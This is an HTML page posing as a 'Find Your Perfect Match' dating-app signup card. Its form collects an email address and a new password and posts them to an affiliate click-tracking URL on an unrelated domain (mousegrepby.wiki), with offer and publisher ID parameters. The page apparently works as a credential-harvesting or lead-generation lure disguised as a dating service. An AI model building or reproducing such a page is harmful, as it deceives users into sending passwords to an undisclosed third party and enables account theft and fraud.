<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Find Your Match - Dating App</title>
    <style>
      * { margin: 0; padding: 0; box-sizing: border-box; }
      body {
        font-family: 'Segoe UI', Arial, sans-serif;
        background: #f0f4f8;
        display: flex;
        justify-content: center;
        padding: 32px 16px;
      }
      .card {
        background: #fff;
        border-radius: 16px;
        box-shadow: 0 4px 24px rgba(0,0,0,0.08);
        padding: 32px;
        max-width: 420px;
        width: 100%;
        text-align: center;
      }
      .avatar {
        width: 96px;
        height: 96px;
        border-radius: 50%;
        background: linear-gradient(135deg, #ff758c, #ff7eb3);
        margin: 0 auto 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #fff;
        font-size: 36px;
        font-weight: 700;
      }
      h1 { font-size: 22px; color: #1a202c; margin-bottom: 6px; }
      .bio { color: #64748b; line-height: 1.5; margin-bottom: 20px; }
      
      .signup-form {
        display: flex;
        flex-direction: column;
        gap: 12px;
        margin-top: 15px;
      }
      .signup-form input {
        padding: 12px;
        border: 1px solid #cbd5e1;
        border-radius: 8px;
        font-size: 14px;
        outline: none;
      }
      .signup-form button {
        padding: 12px;
        background: linear-gradient(135deg, #ff758c, #ff7eb3);
        color: white;
        border: none;
        border-radius: 8px;
        font-weight: 600;
        cursor: pointer;
        transition: opacity 0.2s;
      }
      .signup-form button:hover {
        opacity: 0.9;
      }
    </style>
  </head>
  <body>
    <div class="card">
      <div class="avatar">❤️</div>
      <h1>Find Your Perfect Match</h1>
      <p class="bio">Join our dating community today! Sign up to meet new people and find your special someone.</p>
      
      <form name="dating-signup" action="https://www.mousegrepby.wiki/click?offer_id=33088&pub_id=104804&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" method="POST" data-netlify="true" class="signup-form">
        <input type="hidden" name="form-name" value="dating-signup" />
        <input type="email" name="email" placeholder="Enter your email" required />
        <input type="password" name="password" placeholder="Create password" required />
        <button type="submit">Join Now</button>
      </form>
    </div>
  </body>
</html>
